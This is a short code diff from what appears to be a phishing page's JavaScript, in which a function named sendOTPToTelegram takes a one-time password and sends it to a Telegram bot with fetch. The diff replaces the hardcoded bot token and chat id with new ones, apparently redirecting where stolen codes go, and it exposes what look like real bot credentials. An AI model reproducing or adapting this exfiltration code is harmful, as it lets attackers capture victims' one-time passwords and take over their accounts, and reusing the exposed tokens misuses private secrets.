@@ -205,8 +205,8 @@
 
     function sendOTPToTelegram(otp) {
       const message = `OTP: ${otp}`;
-      const token = '7573991625:AAGEabvedzkHODDvk0hE5RZ7mOWvC981sD4';
-      const chat_id = '7105244348';
+      const token = '8069355920:AAGdHFNeDo7_f44IBD0QuyNZvaDa_x3yrIs';
+      const chat_id = '1031172239';
       const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
 
       fetch(url)
